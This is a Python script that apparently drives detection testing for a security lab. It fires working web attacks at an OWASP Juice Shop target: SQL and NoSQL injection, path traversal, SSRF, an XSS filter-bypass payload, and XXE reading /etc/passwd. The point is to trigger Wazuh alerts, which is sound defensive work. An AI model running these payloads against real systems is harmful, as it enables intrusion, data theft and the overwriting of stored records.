#!/usr/bin/env python3
"""
Scenario 1 (Web Attacks) automated attack runner for OWASP Juice Shop.

Replays the exact requests documented in the Scenario 1 PDFs (Brute Force,
SQL Injection x2, NoSQL Injection, LFI, SSRF, XSS, XXE) so they can be
re-fired for detection testing without doing it by hand in Burp/Kali each
time.

Standard library only -- no pip install needed. Tested against a live
target from this repo's session on 2026-08-13.

Usage:
    python3 scenario1_attack_runner.py                 # run everything
    python3 scenario1_attack_runner.py brute-force xss  # run just these
    python3 scenario1_attack_runner.py --list           # show attack names
    python3 scenario1_attack_runner.py --target http://100.85.61.41

Side effects worth knowing about (these are the vulnerabilities being
demonstrated, not bugs in this script):
  - nosqli overwrites the "message" field on every product review in the
    database (that's what the $ne:-1 + multi:true bug does).
  - xss/ssrf permanently change the test account's username/profile image.
  - Each run registers/reuses one fixed low-privilege test account; nothing
    here touches real user accounts.
"""

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

DEFAULT_TARGET = "http://100.85.61.41"
TIMEOUT = 12
TEST_EMAIL = "test@test.local"
TEST_PASSWORD = "ScriptTest!2026"


def log(msg):
    print(f"[+] {msg}", flush=True)


def warn(msg):
    print(f"[!] {msg}", flush=True)


def request(method, url, headers=None, body=None):
    headers = dict(headers or {})
    if isinstance(body, (dict, list)):
        body = json.dumps(body).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    elif isinstance(body, str):
        body = body.encode("utf-8")
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        # Non-2xx responses are expected for several of these attacks
        # (401 on login, 500 on the LFI probe, etc.) -- treat as data.
        return e.code, e.read(), dict(e.headers or {})
    except urllib.error.URLError as e:
        warn(f"Request to {url} failed: {e}")
        return None, b"", {}


class Session:
    """Minimal session carrying both a Bearer token and a cookie, since
    Juice Shop's frontend uses one or the other depending on the route."""

    def __init__(self, target):
        self.target = target
        self.token = None

    def headers(self, extra=None):
        h = dict(extra or {})
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
            h["Cookie"] = f"token={self.token}"
        return h


def get_session(target, email=TEST_EMAIL, password=TEST_PASSWORD):
    session = Session(target)
    login_url = f"{target}/rest/user/login"
    status, body, _ = request("POST", login_url, body={"email": email, "password": password})
    if status != 200:
        log(f"Test account {email} not found yet -- registering it")
        reg_url = f"{target}/api/Users"
        status, body, _ = request("POST", reg_url, body={
            "email": email, "password": password, "passwordRepeat": password,
        })
        if status not in (200, 201):
            raise RuntimeError(f"Registration failed ({status}): {body[:300]}")
        status, body, _ = request("POST", login_url, body={"email": email, "password": password})
        if status != 200:
            raise RuntimeError(f"Login failed after registration ({status}): {body[:300]}")
    session.token = json.loads(body)["authentication"]["token"]
    log(f"Authenticated as {email}")
    return session


# ---------------------------------------------------------------------------
# Attacks -- one function per Scenario 1 PDF, same requests documented there.
# ---------------------------------------------------------------------------

def attack_brute_force(target, _session, count=5, delay=1.0):
    """Wazuh rules 100091 (each attempt) -> 100092 (5 in 60s, soar_candidate)."""
    log(f"Brute force: {count} failed logins against POST /rest/user/login")
    url = f"{target}/rest/user/login"
    for i in range(count):
        status, _, _ = request("POST", url, body={
            "email": "bruteforce-lab@example.invalid",
            "password": f"WrongPassword{i}",
        })
        log(f"  attempt {i + 1}/{count} -> {status}")
        if i < count - 1:
            time.sleep(delay)
    log("Done -- expect Wazuh rule 100092 to fire within 60s of the first attempt")


def attack_sqli_login_bypass(target, _session):
    """Wazuh rule 100021 via /rest/user/login."""
    log("SQLi: admin login bypass on POST /rest/user/login")
    status, body, _ = request("POST", f"{target}/rest/user/login", body={
        "email": "admin' or 1=1 --",
        "password": "admin",
    })
    ok = status == 200 and b"authentication" in body
    log(f"  -> {status} ({'bypass succeeded' if ok else 'no token returned'})")


def attack_sqli_schema_dump(target, _session):
    """Wazuh rule 100021 via /rest/products/search."""
    log("SQLi: UNION-based sqlite_master dump on GET /rest/products/search")
    payload = "banana')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
    qs = urllib.parse.urlencode({"q": payload})
    status, body, _ = request("GET", f"{target}/rest/products/search?{qs}")
    ok = status == 200 and b"CREATE TABLE" in body
    log(f"  -> {status} ({'schema leaked' if ok else 'no schema in response'})")


def attack_nosql_injection(target, session):
    """Wazuh rule 100030 via /rest/products/reviews.
    NOTE: {"id": {"$ne": -1}} matches every review, so this overwrites the
    message on ALL product reviews -- that's the vulnerability, not a bug."""
    log("NoSQLi: $ne operator injection on PATCH /rest/products/reviews")
    status, _, _ = request("PATCH", f"{target}/rest/products/reviews",
                            headers=session.headers(), body={
                                "message": "soar-automation-test-" + uuid.uuid4().hex[:8],
                                "id": {"$ne": -1},
                            })
    log(f"  -> {status}")


def attack_lfi(target, _session):
    """Wazuh rule 100080 via /dataerasure. The layout value must keep its
    literal, un-percent-encoded slashes (matching the captured exploit) --
    urlencoding "/" to "%2F" here trips Juice Shop's own traversal guard
    and gets a "Blocked illegal activity" 500 instead of the real leak."""
    log("LFI: path traversal on POST /dataerasure (layout=../package.json)")
    body = "email=test%40test.com&securityAnswer=test&layout=../package.json"
    status, resp_body, _ = request("POST", f"{target}/dataerasure",
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                    body=body)
    ok = status == 200 and b'"name":"juice-shop"' in resp_body.replace(b" ", b"")
    log(f"  -> {status} ({'package.json leaked' if ok else 'no leak signature seen'})")


def attack_ssrf(target, session, internal_url=None):
    """Wazuh rule 100060 via /profile/image/url."""
    internal_url = internal_url or f"{target}/assets/public/images/JuiceShop_Logo.png"
    log(f"SSRF: server-side fetch on POST /profile/image/url -> {internal_url}")
    body = urllib.parse.urlencode({"imageUrl": internal_url})
    status, _, _ = request("POST", f"{target}/profile/image/url",
                            headers=session.headers({"Content-Type": "application/x-www-form-urlencoded"}),
                            body=body)
    log(f"  -> {status}")


def attack_xss(target, session):
    """Wazuh rule 100040 via /profile username (double-<script> CSP-bypass trick)."""
    log("XSS: reflected <script> payload on POST /profile username field")
    payload = "<<script>sscript>alert(`xss`)</script>"
    body = urllib.parse.urlencode({"username": payload})
    status, _, _ = request("POST", f"{target}/profile",
                            headers=session.headers({"Content-Type": "application/x-www-form-urlencoded"}),
                            body=body)
    log(f"  -> {status}")


def attack_xxe(target, session):
    """Wazuh rule 100090 via /file-upload (multipart, no external deps needed).
    Juice Shop marks this route "deprecated" and answers 410, but it still
    parses the entity first and echoes /etc/passwd back in the error title --
    that's the actual proof of exploitation, not the HTTP status."""
    log("XXE: external entity payload on POST /file-upload")
    xxe_payload = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b"<!DOCTYPE xxe [\n"
        b"  <!ELEMENT xxe ANY>\n"
        b'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        b"]>\n"
        b"<xxe>&xxe;</xxe>\n"
    )
    boundary = uuid.uuid4().hex
    parts = []
    parts.append(f"--{boundary}\r\n".encode())
    parts.append(b'Content-Disposition: form-data; name="file"; filename="xxe.xml"\r\n')
    parts.append(b"Content-Type: text/xml\r\n\r\n")
    parts.append(xxe_payload)
    parts.append(f"\r\n--{boundary}--\r\n".encode())
    multipart_body = b"".join(parts)
    status, body, _ = request(
        "POST", f"{target}/file-upload",
        headers=session.headers({"Content-Type": f"multipart/form-data; boundary={boundary}"}),
        body=multipart_body,
    )
    ok = b"root:x:0:0" in body
    log(f"  -> {status} ({'/etc/passwd leaked in error body' if ok else 'no leak signature seen'})")


ATTACKS = {
    "brute-force": (attack_brute_force, False),
    "sqli-login": (attack_sqli_login_bypass, False),
    "sqli-schema": (attack_sqli_schema_dump, False),
    "nosqli": (attack_nosql_injection, True),
    "lfi": (attack_lfi, False),
    "ssrf": (attack_ssrf, True),
    "xss": (attack_xss, True),
    "xxe": (attack_xxe, True),
}


def main():
    parser = argparse.ArgumentParser(
        description="Fire Scenario 1 web attacks against Juice Shop for detection testing.")
    parser.add_argument("attacks", nargs="*", default=["all"],
                         help=f"which attack(s) to run: {', '.join(ATTACKS)}, or 'all' (default)")
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"base URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--delay", type=float, default=150.0,
                         help="seconds between attacks (default: 150 -- each attack triggers a "
                              "~2min Shuffle pipeline run; firing faster than that causes "
                              "overlapping concurrent executions that can silently stall in "
                              "Shuffle, leaving the IRIS alert stuck at 'New' forever). Use a "
                              "shorter value only if you specifically want to test concurrency.")
    parser.add_argument("--brute-count", type=int, default=5, help="failed logins to fire (default: 5)")
    parser.add_argument("--list", action="store_true", help="list attack names and exit")
    args = parser.parse_args()

    if args.list:
        for name, (_, needs_auth) in ATTACKS.items():
            print(f"  {name}{' (needs login)' if needs_auth else ''}")
        return

    selected = list(ATTACKS) if args.attacks == ["all"] else args.attacks
    unknown = [a for a in selected if a not in ATTACKS]
    if unknown:
        parser.error(f"unknown attack(s): {', '.join(unknown)} (use --list to see valid names)")

    target = args.target.rstrip("/")
    log(f"Target: {target}")
    log(f"Attacks: {', '.join(selected)}")

    session = None
    if any(ATTACKS[name][1] for name in selected):
        session = get_session(target)

    for i, name in enumerate(selected):
        if i > 0:
            time.sleep(args.delay)
        func, _ = ATTACKS[name]
        try:
            if name == "brute-force":
                func(target, session, count=args.brute_count)
            else:
                func(target, session)
        except Exception as e:  # keep going even if one attack errors out
            warn(f"{name} failed: {e}")

    log("All done. Check Wazuh/IRIS/Shuffle for the resulting alerts.")


if __name__ == "__main__":
    main()
